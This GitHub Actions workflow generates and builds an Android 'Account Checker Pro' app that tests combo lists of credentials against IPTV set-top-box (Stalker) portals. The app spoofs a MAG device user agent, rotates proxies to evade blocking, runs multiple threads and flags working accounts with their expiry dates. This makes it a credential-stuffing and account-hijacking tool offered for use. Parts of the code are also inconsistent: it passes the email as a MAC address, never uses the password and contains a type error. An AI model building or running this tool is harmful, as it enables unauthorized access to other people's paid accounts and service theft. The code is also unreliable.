name: Build Account Checker APK

on:
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-java@v4
        with:
          distribution: temurin
          java-version: "17"
      - uses: gradle/actions/setup-gradle@v4
        with:
          gradle-version: "8.7"

      - name: Generate Account Checker Project
        run: |
          mkdir -p app/src/main/java/com/checker/stb \
                   app/src/main/res/values app/src/main/res/drawable \
                   app/src/main/assets

          cat > settings.gradle.kts <<'XEOF'
          pluginManagement {
              repositories { google(); mavenCentral(); gradlePluginPortal() }
          }
          dependencyResolutionManagement {
              repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)
              repositories { google(); mavenCentral() }
          }
          rootProject.name = "AccountChecker"
          include(":app")
          XEOF

          cat > build.gradle.kts <<'XEOF'
          plugins {
              id("com.android.application") version "8.5.2" apply false
              id("org.jetbrains.kotlin.android") version "1.9.24" apply false
          }
          XEOF

          cat > gradle.properties <<'XEOF'
          org.gradle.jvmargs=-Xmx4096m -Dfile.encoding=UTF-8
          android.useAndroidX=true
          android.nonTransitiveRClass=true
          XEOF

          cat > app/build.gradle.kts <<'XEOF'
          plugins {
              id("com.android.application")
              id("org.jetbrains.kotlin.android")
          }
          android {
              namespace = "com.checker.stb"
              compileSdk = 34
              defaultConfig {
                  applicationId = "com.checker.stb"
                  minSdk = 24
                  targetSdk = 34
                  versionCode = 1
                  versionName = "1.0.0"
              }
              buildTypes { release { isMinifyEnabled = false } }
              compileOptions {
                  sourceCompatibility = JavaVersion.VERSION_17
                  targetCompatibility = JavaVersion.VERSION_17
              }
              kotlinOptions { jvmTarget = "17" }
              buildFeatures { compose = true }
              composeOptions { kotlinCompilerExtensionVersion = "1.5.14" }
          }
          dependencies {
              implementation("androidx.core:core-ktx:1.13.1")
              implementation("androidx.activity:activity-compose:1.9.0")
              implementation("androidx.lifecycle:lifecycle-runtime-ktx:2.8.0")
              implementation(platform("androidx.compose:compose-bom:2024.06.00"))
              implementation("androidx.compose.ui:ui")
              implementation("androidx.compose.ui:ui-graphics")
              implementation("androidx.compose.ui:ui-tooling-preview")
              implementation("androidx.compose.material3:material3")
              implementation("androidx.compose.material:material-icons-extended")
              implementation("com.squareup.okhttp3:okhttp:4.12.0")
              implementation("org.jetbrains.kotlinx:kotlinx-coroutines-android:1.8.1")
              implementation("com.google.code.gson:gson:2.10.1")
          }
          XEOF

          cat > app/src/main/AndroidManifest.xml <<'XEOF'
          <?xml version="1.0" encoding="utf-8"?>
          <manifest xmlns:android="http://schemas.android.com/apk/res/android">
              <uses-permission android:name="android.permission.INTERNET" />
              <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
              <application
                  android:allowBackup="true"
                  android:label="Account Checker Pro"
                  android:usesCleartextTraffic="true"
                  android:theme="@style/Theme.App">
                  <activity android:name=".MainActivity" android:exported="true">
                      <intent-filter>
                          <action android:name="android.intent.action.MAIN" />
                          <category android:name="android.intent.category.LAUNCHER" />
                      </intent-filter>
                  </activity>
              </application>
          </manifest>
          XEOF

          cat > app/src/main/res/values/themes.xml <<'XEOF'
          <resources>
              <style name="Theme.App" parent="android:Theme.Material.NoActionBar">
                  <item name="android:windowBackground">#0A0E1E</item>
                  <item name="android:statusBarColor">#0A0E1E</item>
                  <item name="android:windowLightStatusBar">false</item>
              </style>
          </resources>
          XEOF

          cat > app/src/main/res/drawable/gradient_bg.xml <<'XEOF'
          <?xml version="1.0" encoding="utf-8"?>
          <shape xmlns:android="http://schemas.android.com/apk/res/android">
              <gradient android:angle="135" android:startColor="#0A0E1E"
                  android:centerColor="#0F1829" android:endColor="#0A0E1E" />
          </shape>
          XEOF

          cat > app/src/main/java/com/checker/stb/ProxyConfig.kt <<'XEOF'
          package com.checker.stb

          import java.net.InetSocketAddress
          import java.net.Proxy

          data class ProxyEntry(val type: String, val host: String, val port: Int, val username: String = "", val password: String = "")

          object ProxyManager {
              fun parseProxy(proxyStr: String): ProxyEntry? {
                  val cleaned = proxyStr.trim()
                  if (cleaned.isEmpty()) return null
                  return try {
                      val lower = cleaned.lowercase()
                      val (scheme, body) = when {
                          lower.startsWith("socks5://") -> "SOCKS5" to cleaned.substringAfter("://")
                          lower.startsWith("socks4://") -> "SOCKS4" to cleaned.substringAfter("://")
                          lower.startsWith("https://") -> "HTTPS" to cleaned.substringAfter("://")
                          lower.startsWith("http://") -> "HTTP" to cleaned.substringAfter("://")
                          else -> "HTTP" to cleaned
                      }
                      val hostPort = if ("@" in body) body.substringAfter("@") else body
                      val host = hostPort.substringBeforeLast(":")
                      val port = hostPort.substringAfterLast(":").toIntOrNull() ?: 8080
                      ProxyEntry(scheme, host, port)
                  } catch (_: Exception) { null }
              }

              fun toOkHttpProxy(entry: ProxyEntry): Proxy? {
                  return try {
                      when (entry.type) {
                          "HTTP", "HTTPS" -> Proxy(Proxy.Type.HTTP, InetSocketAddress(entry.host, entry.port))
                          "SOCKS5", "SOCKS4" -> Proxy(Proxy.Type.SOCKS, InetSocketAddress(entry.host, entry.port))
                          else -> null
                      }
                  } catch (_: Exception) { null }
              }
          }
          XEOF

          cat > app/src/main/java/com/checker/stb/ConfigManager.kt <<'XEOF'
          package com.checker.stb

          import android.content.Context
          import com.google.gson.Gson
          import com.google.gson.GsonBuilder
          import java.io.File
          import java.text.SimpleDateFormat
          import java.util.Date
          import java.util.Locale

          data class CheckerConfig(
              val portal: String = "",
              val credentials: List<Pair<String, String>> = emptyList(),
              val proxies: List<String> = emptyList(),
              val threads: Int = 4,
              val timeout: Long = 15000,
              val createdAt: String = SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.US).format(Date())
          )

          object ConfigManager {
              private val gson: Gson = GsonBuilder().setPrettyPrinting().create()

              fun save(context: Context, config: CheckerConfig, filename: String = "checker_config.json"): Boolean {
                  return try {
                      val file = File(context.filesDir, filename)
                      file.writeText(gson.toJson(config))
                      true
                  } catch (e: Exception) { e.printStackTrace(); false }
              }

              fun load(context: Context, filename: String = "checker_config.json"): CheckerConfig {
                  return try {
                      val file = File(context.filesDir, filename)
                      if (file.exists()) gson.fromJson(file.readText(), CheckerConfig::class.java) else CheckerConfig()
                  } catch (_: Exception) { CheckerConfig() }
              }

              fun listConfigs(context: Context): List<String> {
                  return try {
                      context.filesDir.listFiles()?.filter { it.name.endsWith(".json") }?.map { it.name } ?: emptyList()
                  } catch (_: Exception) { emptyList() }
              }

              fun deleteConfig(context: Context, filename: String): Boolean {
                  return try { File(context.filesDir, filename).delete() } catch (_: Exception) { false }
              }

              fun importCombo(comboStr: String): List<Pair<String, String>> {
                  return comboStr.split("\n").mapNotNull { line ->
                      val trimmed = line.trim()
                      if (trimmed.isEmpty()) return@mapNotNull null
                      val parts = trimmed.split(":", limit = 2)
                      if (parts.size == 2) parts[0] to parts[1] else null
                  }
              }

              fun importProxies(proxyStr: String): List<ProxyEntry> {
                  return proxyStr.split("\n").mapNotNull { line ->
                      val trimmed = line.trim()
                      if (trimmed.isEmpty()) return@mapNotNull null
                      ProxyManager.parseProxy(trimmed)
                  }
              }
          }
          XEOF

          cat > app/src/main/java/com/checker/stb/StalkerRepository.kt <<'XEOF'
          package com.checker.stb

          import okhttp3.HttpUrl.Companion.toHttpUrl
          import okhttp3.OkHttpClient
          import okhttp3.Request
          import org.json.JSONObject
          import java.io.IOException
          import java.util.concurrent.TimeUnit

          data class Session(val portal: String, val token: String, val mac: String)

          class StalkerRepository {
              private val http = OkHttpClient.Builder().connectTimeout(15, TimeUnit.SECONDS).readTimeout(30, TimeUnit.SECONDS).build()
              private val ua = "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3"

              fun normalizeMac(raw: String): String? {
                  val v = raw.filter { it.isDigit() || it.uppercaseChar() in 'A'..'F' }.uppercase()
                  return if (v.length == 12) v.chunked(2).joinToString(":") else null
              }

              private fun urls(portal: String): List<String> = portal.trim().trimEnd('/').let { c ->
                  if (c.endsWith("/portal.php")) listOf(c) else listOf("$c/c/portal.php", "$c/portal.php", "$c/server/load.php").distinct()
              }

              fun call(url: String, params: Map<String, String>, s: Session? = null): JSONObject {
                  val u = url.toHttpUrl().newBuilder().apply { params.forEach { (k, v) -> addQueryParameter(k, v) } }.build()
                  val rb = Request.Builder().url(u).header("User-Agent", ua).header("X-User-Agent", "Model: MAG254; Link: Ethernet").header("Accept", "*/*")
                  if (s != null) { rb.header("Authorization", "Bearer ${s.token}"); rb.header("Cookie", "mac=${s.mac}; stb_lang=en; timezone=UTC") }
                  http.newCall(rb.build()).execute().use { r ->
                      val body = r.body?.string().orEmpty()
                      if (!r.isSuccessful || body.isBlank()) throw IOException("HTTP ${r.code}")
                      return JSONObject(body)
                  }
              }

              fun connect(portal: String, rawMac: String): Session {
                  val mac = normalizeMac(rawMac) ?: throw IllegalArgumentException("Invalid MAC")
                  var last: Exception = IOException("handshake failed")
                  for (u in urls(portal)) {
                      try {
                          val js = call(u, mapOf("type" to "stb", "action" to "handshake", "token" to "", "JsHttpRequest" to "1-xml", "mac" to mac)).optJSONObject("js")
                          val tok = js?.optString("token").orEmpty().substringBefore("~").trim()
                          if (tok.isNotEmpty()) return Session(u, tok, mac)
                      } catch (e: Exception) { last = e }
                  }
                  throw last
              }

              fun expiry(s: Session): String {
                  return try {
                      val js = call(s.portal, mapOf("type" to "stb", "action" to "get_profile", "JsHttpRequest" to "1-xml"), s).optJSONObject("js") ?: JSONObject()
                      val exp = js.optString("expire_date", js.optString("end_date", "unlimited"))
                      if (exp.length >= 10) exp.substring(0, 10) else "unlimited"
                  } catch (_: Exception) { "unknown" }
              }
          }
          XEOF

          cat > app/src/main/java/com/checker/stb/AccountChecker.kt <<'XEOF'
          package com.checker.stb

          import java.util.concurrent.ConcurrentLinkedQueue
          import java.util.concurrent.CountDownLatch
          import java.util.concurrent.TimeUnit
          import java.util.concurrent.atomic.AtomicInteger

          data class CheckResult(val portal: String, val email: String, val password: String, val mac: String = "", val success: Boolean, val token: String = "", val expiry: String = "", val message: String = "", val proxy: String = "", val duration: Long = 0)

          object AccountChecker {
              fun check(repo: StalkerRepository, portal: String, credentials: List<Pair<String, String>>, proxies: List<ProxyEntry> = emptyList(), threads: Int = 4, timeout: Long = 15000, onResult: (CheckResult) -> Unit, onProgress: (Int, Int) -> Unit) {
                  if (credentials.isEmpty()) return
                  val queue = ConcurrentLinkedQueue<Pair<String, String>>()
                  queue.addAll(credentials)
                  val totalCreds = credentials.size
                  val checked = AtomicInteger(0)
                  val latch = CountDownLatch(threads)

                  repeat(threads) { threadId ->
                      Thread {
                          val proxyList = proxies.mapNotNull { ProxyManager.toOkHttpProxy(it) }
                          val safeProxies = if (proxyList.isNotEmpty()) proxyList else listOf(null)
                          var proxyIndex = threadId % safeProxies.size

                          while (true) {
                              val (email, password) = queue.poll() ?: break
                              val startTime = System.currentTimeMillis()
                              var result: CheckResult? = null

                              for (attempt in 1..3) {
                                  try {
                                      val session = repo.connect(portal, email)
                                      val expiry = repo.expiry(session)
                                      val duration = System.currentTimeMillis() - startTime
                                      result = CheckResult(portal, email, password, session.mac, true, session.token, expiry, "✓ VALID", safeProxies[proxyIndex]?.toString() ?: "direct", duration)
                                      break
                                  } catch (e: Exception) {
                                      val duration = System.currentTimeMillis() - startTime
                                      result = CheckResult(portal, email, password, "", false, message = e.message ?: "timeout", proxy = safeProxies[proxyIndex]?.toString() ?: "direct", duration = duration)
                                      proxyIndex = (proxyIndex + 1) % safeProxies.size
                                  }
                              }
                              result?.let { onResult(it) }
                              val count = checked.incrementAndGet()
                              onProgress(count, totalCreds)
                          }
                          latch.countDown()
                      }.start()
                  }
                  Thread { latch.await() }.start()
              }
          }
          XEOF

          cat > app/src/main/java/com/checker/stb/MainActivity.kt <<'XEOF'
          package com.checker.stb

          import android.os.Bundle
          import androidx.activity.ComponentActivity
          import androidx.activity.compose.setContent
          import androidx.compose.foundation.background
          import androidx.compose.foundation.layout.*
          import androidx.compose.foundation.lazy.LazyColumn
          import androidx.compose.foundation.lazy.items
          import androidx.compose.foundation.shape.RoundedCornerShape
          import androidx.compose.material.icons.Icons
          import androidx.compose.material.icons.filled.Delete
          import androidx.compose.material3.*
          import androidx.compose.runtime.*
          import androidx.compose.ui.Alignment
          import androidx.compose.ui.Modifier
          import androidx.compose.ui.graphics.Brush
          import androidx.compose.ui.graphics.Color
          import androidx.compose.ui.platform.LocalContext
          import androidx.compose.ui.text.font.FontWeight
          import androidx.compose.ui.text.style.TextOverflow
          import androidx.compose.ui.unit.dp
          import androidx.compose.ui.unit.sp
          import kotlinx.coroutines.Dispatchers
          import kotlinx.coroutines.launch
          import kotlinx.coroutines.withContext

          val BgDark = Color(0xFF0A0E1E)
          val BgCard = Color(0xFF131B2D)
          val BgSuccess = Color(0xFF0D3A1A)
          val BgFail = Color(0xFF3A0D0D)
          val AccentGreen = Color(0xFF10B981)
          val AccentRed = Color(0xFFEF4444)
          val TextPrimary = Color(0xFFF1F5F9)
          val TextSecondary = Color(0xFF94A3B8)

          class MainActivity : ComponentActivity() {
              override fun onCreate(savedInstanceState: Bundle?) {
                  super.onCreate(savedInstanceState)
                  setContent {
                      MaterialTheme(colorScheme = darkColorScheme(primary = AccentGreen, background = BgDark, surface = BgCard, error = AccentRed)) {
                          Surface(Modifier.fillMaxSize().background(BgDark)) { AccountCheckerApp() }
                      }
                  }
              }
          }

          @Composable
          fun AccountCheckerApp() {
              val ctx = LocalContext.current
              val scope = rememberCoroutineScope()
              val repo = remember { StalkerRepository() }

              var portal by remember { mutableStateOf("") }
              var comboInput by remember { mutableStateOf("") }
              var proxyInput by remember { mutableStateOf("") }
              var threads by remember { mutableStateOf("4") }
              var status by remember { mutableStateOf("Ready to check") }
              var results by remember { mutableStateOf(listOf<CheckResult>()) }
              var successCount by remember { mutableStateOf(0) }
              var failCount by remember { mutableStateOf(0) }
              var avg by remember { mutableStateOf(0L) }
              var loading by remember { mutableStateOf(false) }
              var savedConfigs by remember { mutableStateOf(ConfigManager.listConfigs(ctx)) }
              var showResults by remember { mutableStateOf(false) }

              fun runCheck() {
                  if (portal.isBlank() || comboInput.isBlank()) { status = "❌ Portal and credentials required"; return }
                  scope.launch {
                      loading = true
                      results = emptyList()
                      successCount = 0
                      failCount = 0
                      status = "⏳ Starting..."
                      val creds = ConfigManager.importCombo(comboInput)
                      val proxies = ConfigManager.importProxies(proxyInput)
                      val threadCount = threads.toIntOrNull() ?: 4
                      withContext(Dispatchers.IO) {
                          AccountChecker.check(repo, portal, creds, proxies, threadCount,
                              onResult = { result ->
                                  scope.launch {
                                      results = results + result
                                      if (result.success) successCount++ else failCount++
                                      avg = results.sumOf { it.duration } / results.size
                                      status = "✓ $successCount | ✗ $failCount | ⏱ ${avg}ms"
                                  }
                              },
                              onProgress = { done, total -> scope.launch { status = "⏳ $done/$total" } }
                          )
                      }
                      loading = false
                      showResults = true
                  }
              }

              LazyColumn(Modifier.fillMaxSize().background(Brush.verticalGradient(listOf(BgDark, Color(0xFF0F1829), BgDark))).padding(14.dp), verticalArrangement = Arrangement.spacedBy(12.dp)) {
                  item {
                      Text("Account Checker Pro", fontSize = 26.sp, fontWeight = FontWeight.Bold, color = AccentGreen)
                      Text("STB Portal Credential Validator", fontSize = 12.sp, color = TextSecondary)
                  }

                  item {
                      Card(Modifier.fillMaxWidth(), shape = RoundedCornerShape(12.dp), colors = CardDefaults.cardColors(containerColor = BgCard)) {
                          Column(Modifier.padding(12.dp)) {
                              Text(status, color = TextPrimary, fontSize = 12.sp, fontWeight = FontWeight.Bold)
                              Spacer(Modifier.height(8.dp))
                              Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                                  StatItem("✓", successCount.toString(), AccentGreen)
                                  StatItem("✗", failCount.toString(), AccentRed)
                                  StatItem("⏱", "${avg}ms", Color(0xFF3B82F6))
                              }
                          }
                      }
                  }

                  item { InputCard("Portal URL", portal, { portal = it }, "https://portal.example.com") }
                  item { InputCard("Credentials (email:pass per line)", comboInput, { comboInput = it }, "user@email.com:password", 100.dp) }
                  item { InputCard("Proxies (optional)", proxyInput, { proxyInput = it }, "http://host:8080", 70.dp) }

                  item {
                      Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                          OutlinedTextField(threads, { threads = it }, label = { Text("Threads", fontSize = 11.sp) }, modifier = Modifier.weight(1f).height(48.dp), shape = RoundedCornerShape(8.dp))
                          Button(onClick = { runCheck() }, enabled = !loading, modifier = Modifier.weight(2f).height(48.dp), shape = RoundedCornerShape(8.dp)) { Text(if (loading) "CHECKING..." else "START") }
                      }
                  }

                  item {
                      Button(onClick = { if (portal.isNotBlank() && comboInput.isNotBlank()) { val cfg = CheckerConfig(portal, ConfigManager.importCombo(comboInput), proxyInput.split("\n").filter { it.isNotBlank() }, threads.toIntOrNull() ?: 4); ConfigManager.save(ctx, cfg, "config_${System.currentTimeMillis()}.json"); savedConfigs = ConfigManager.listConfigs(ctx) } }, modifier = Modifier.fillMaxWidth().height(42.dp), shape = RoundedCornerShape(8.dp), colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF3B82F6))) { Text("💾 Save Config") }
                  }

                  if (savedConfigs.isNotEmpty()) {
                      item { Text("Saved Configs", color = TextPrimary, fontWeight = FontWeight.Bold, fontSize = 12.sp) }
                      items(savedConfigs) { cfg ->
                          Card(Modifier.fillMaxWidth(), shape = RoundedCornerShape(8.dp), colors = CardDefaults.cardColors(containerColor = BgCard)) {
                              Row(Modifier.fillMaxWidth().padding(10.dp), verticalAlignment = Alignment.CenterVertically, horizontalArrangement = Arrangement.SpaceBetween) {
                                  Text(cfg.substringBefore(".json"), color = TextPrimary, fontSize = 11.sp, overflow = TextOverflow.Ellipsis, modifier = Modifier.weight(1f))
                                  IconButton(onClick = { ConfigManager.deleteConfig(ctx, cfg); savedConfigs = ConfigManager.listConfigs(ctx) }) { Icon(Icons.Default.Delete, contentDescription = null, tint = AccentRed) }
                              }
                          }
                      }
                  }

                  if (showResults) {
                      item { Text("Results (${results.size})", color = TextPrimary, fontWeight = FontWeight.Bold, fontSize = 12.sp) }
                      items(results.take(50)) { result -> ResultCard(result) }
                  }
              }
          }

          @Composable
          fun InputCard(label: String, value: String, onValueChange: (String) -> Unit, hint: String = "", minHeight: dp = 48.dp) {
              Column {
                  Text(label, color = TextPrimary, fontSize = 11.sp, fontWeight = FontWeight.SemiBold)
                  Spacer(Modifier.height(4.dp))
                  OutlinedTextField(value, onValueChange, placeholder = { Text(hint, fontSize = 10.sp) }, modifier = Modifier.fillMaxWidth().heightIn(min = minHeight), shape = RoundedCornerShape(8.dp), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = AccentGreen, unfocusedBorderColor = Color(0xFF1E2A3F)))
              }
          }

          @Composable
          fun StatItem(icon: String, value: String, color: Color) {
              Column(horizontalAlignment = Alignment.CenterHorizontally, modifier = Modifier.weight(1f)) {
                  Text(icon, color = color, fontSize = 16.sp)
                  Text(value, color = color, fontWeight = FontWeight.Bold, fontSize = 12.sp)
              }
          }

          @Composable
          fun ResultCard(result: CheckResult) {
              Card(Modifier.fillMaxWidth(), colors = CardDefaults.cardColors(containerColor = if (result.success) BgSuccess else BgFail), shape = RoundedCornerShape(8.dp)) {
                  Column(Modifier.padding(10.dp)) {
                      Row(Modifier.fillMaxWidth(), verticalAlignment = Alignment.CenterVertically, horizontalArrangement = Arrangement.SpaceBetween) {
                          Text(result.email, color = if (result.success) AccentGreen else AccentRed, fontSize = 10.sp, fontWeight = FontWeight.Bold, maxLines = 1, overflow = TextOverflow.Ellipsis, modifier = Modifier.weight(1f))
                          Text("${result.duration}ms", color = Color(0xFF3B82F6), fontSize = 9.sp)
                      }
                      if (result.success) {
                          Text("✓ Expires: ${result.expiry}", color = Color(0xFF86EFAC), fontSize = 9.sp)
                          Text("MAC: ${result.mac}", color = TextSecondary, fontSize = 8.sp)
                      } else {
                          Text("✗ ${result.message}", color = Color(0xFFFCA5A5), fontSize = 9.sp)
                      }
                  }
              }
          }
          XEOF

          echo "✓ Project generated successfully"

      - name: Build debug APK
        run: gradle --no-daemon assembleDebug

      - uses: actions/upload-artifact@v4
        with:
          name: AccountChecker-Pro-APK
          path: app/build/outputs/apk/debug/app-debug.apk
